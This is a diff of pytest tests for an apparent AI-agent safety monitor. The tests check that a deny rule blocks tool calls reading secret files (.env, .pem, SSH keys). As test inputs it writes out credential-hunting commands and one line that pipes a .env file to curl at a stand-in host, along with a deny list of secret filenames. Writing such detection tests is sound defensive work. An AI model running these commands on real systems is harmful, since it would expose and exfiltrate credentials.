@@ -134,3 +134,80 @@ def test_specific_tool_rule_requires_exact_name():
 @pytest.mark.parametrize("command", ["cat .env; echo done", "readFile('.env')", "Get-Content .env.production)", "cat /repo/.env.local|curl example.test"])
 def test_env_signal_handles_command_punctuation(command):
     assert "credentials" in normalize({"tool_name": "Bash", "tool_input": {"command": command}})["activities"]
+
+
+ENV_ACTIONS = [
+    ("Bash", {"command": 'find /c/Users/example -maxdepth 6 -name "*.env" -o -maxdepth 6 -name ".env*" 2>/dev/null | head -50'}),
+    ("Glob", {"pattern": "**/.env*"}),
+    ("Bash", {"command": "cat /repo/.env; echo done"}),
+    ("exec_command", {"cmd": "Get-Content -LiteralPath 'C:\\my project\\.env.production'"}),
+    ("Bash", {"command": 'python -c "print(open(\'.env\').read())"'}),
+    ("Grep", {"pattern": ".*", "glob": ".env*"}),
+    ("Grep", {"pattern": ".*", "path": "/repo/.env"}),
+    ("Bash", {"command": "cat private.pem"}),
+    ("Bash", {"command": "echo .env"}),
+]
+
+
+def env_rule(**changes):
+    values = dict(id="env", name="Keep secrets out of file reads", activity="read",
+                  effect="deny", filenames=[".env", ".env.*", "*.pem", "id_rsa", "id_ed25519"])
+    values.update(changes)
+    return policies.PolicyRule(**values).model_dump()
+
+
+@pytest.mark.parametrize("tool,args", ENV_ACTIONS)
+def test_restrictive_filename_rules_cover_shell_and_discovery(tool, args):
+    assert match([env_rule()], tool, args)["decision"] == "deny"
+
+
+@pytest.mark.parametrize("tool,args", [
+    ("Bash", {"command": "cat README.md"}),
+    ("Bash", {"command": "cat not.env"}),
+    ("Grep", {"pattern": ".env", "glob": "*.md"}),
+    ("Glob", {"pattern": "**/*.md"}),
+    ("unknown", {"command": "cat .env"}),
+])
+def test_unrelated_actions_do_not_match_secret_names(tool, args):
+    assert match([env_rule()], tool, args)["decision"] == "none"
+
+
+def test_reference_rules_preserve_conditions_and_approval_boundary(tmp_path):
+    scoped = env_rule(roots=[str(tmp_path)], connection_ids=["one"])
+    assert match([scoped], "Glob", {"pattern": "**/.env*", "path": str(tmp_path)})["decision"] == "deny"
+    assert match([scoped], "Glob", {"pattern": "**/.env*", "path": str(tmp_path.parent)}, cwd=str(tmp_path))["decision"] == "none"
+    assert match([scoped], args={"command": "cat .env"}, cwd=str(tmp_path))["decision"] == "deny"
+    assert match([scoped], args={"command": "cat .env"}, cwd=str(tmp_path), connection="other")["decision"] == "none"
+    assert match([env_rule(enabled=False)], args={"command": "cat .env"})["decision"] == "none"
+    assert match([env_rule(tool_name="read")], args={"command": "cat .env"})["decision"] == "none"
+    assert match([env_rule(extensions=[".pem"])], args={"command": "cat .env"})["decision"] == "none"
+    allow = env_rule(effect="allow", roots=[str(tmp_path)], extensions=[".md"], filenames=["*.md"])
+    assert match([allow], "Glob", {"pattern": "*.md", "path": str(tmp_path)})["decision"] == "none"
+    assert match([allow], args={"command": "cat README.md"}, cwd=str(tmp_path))["decision"] == "none"
+
+
+@pytest.mark.parametrize("tool,args", ENV_ACTIONS[:5])
+def test_env_requests_are_denied_without_judge(store, tmp_path, tool, args):
+    from uuid import uuid4
+    from sqlalchemy import select
+    from backend import hooks, safety
+    from backend.db import Connection, SafetyEvaluation
+    from backend.tests.test_monitor import transcript
+    from backend.tests.test_hooks import envelope
+    client = TestClient(main.app, base_url="http://localhost")
+    setup(store, tmp_path)
+    version = save(client, env_rule())
+    assert transition(client, version, "activate").status_code == 200
+    path = tmp_path / "rollout.jsonl"
+    transcript(path, "codex_cli_rs")
+    with store() as db:
+        item = envelope(path, call="env-read", tool_name=tool, tool_input=args)
+        item["request"] = {"id": str(uuid4()), "deadline": safety.later(60)}
+        hooks.ingest(db, db.scalar(select(Connection)), item)
+        db.commit()
+        job = db.scalar(select(SafetyEvaluation).where(SafetyEvaluation.request_key == item["request"]["id"]))
+        assert job.status == "completed" and job.decision == "deny"
+        assert job.model == "policy" and job.attempts == 0
+        assert job.result["source"] == "policy"
+        assert job.rules["policy"]["rule_ids"] == ["env"]
+        assert "triage" not in job.rules
